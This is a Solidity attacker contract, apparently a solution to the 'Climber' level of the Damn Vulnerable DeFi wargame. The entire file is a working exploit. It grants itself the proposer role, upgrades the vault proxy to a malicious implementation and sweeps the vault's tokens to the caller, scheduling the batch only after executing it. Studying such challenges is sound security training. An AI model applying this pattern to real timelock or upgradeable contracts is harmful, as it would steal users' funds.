// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

/**
 * @title ClimberAttacker
 * @author your boi, 
 * with some help from https://github.com/lior-abadi/damn-vulnerable-defi-solutions/blob/master/contracts/climber/ClimberCracker.sol
 */
contract ClimberAttacker is AccessControl {
    using Address for address;

    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    address payable private timelock;
    address private vault;
    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private salt;

    constructor(
        address payable _timelock,
        address _vault
    ) {
        timelock = _timelock;
        vault = _vault;
    }

    function executeOnTimelock(address _vaultPwned, address _token) external {
        // 1) make attacker contract, the proposer
        targets.push(timelock);
        values.push(0);
        dataElements.push(abi.encodeWithSignature(
            "grantRole(bytes32,address)", PROPOSER_ROLE, address(this)
        ));

        // 2) upgrade ClimberVault -> ClimberVaultPwned
        // ##### unable to call initialize() on _vaultPwned using upgradeToAndCall(), #######
        // ##### hence added 'address to' in sweepFunds() instead   #########################
        targets.push(vault);
        values.push(0);
        dataElements.push(abi.encodeWithSignature(
            "upgradeTo(address)", _vaultPwned
        ));

        // 3) sweep proxy off of all DVTs using ClimberVaultPwned
        targets.push(vault);
        values.push(0);
        dataElements.push(abi.encodeWithSignature(
            "sweepFunds(address,address)", _token, msg.sender
        ));

        // schedule 1, 2, 3, and this scheduling txn
        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature(
            "scheduleAll()"
        ));

        // could be anything
        salt = bytes32('xyz');

        ClimberTimelock(timelock).execute(targets, values, dataElements, salt);
    }

    function scheduleAll() external {
        ClimberTimelock(timelock).schedule(targets, values, dataElements, salt);
    }

    receive() external payable {}
}
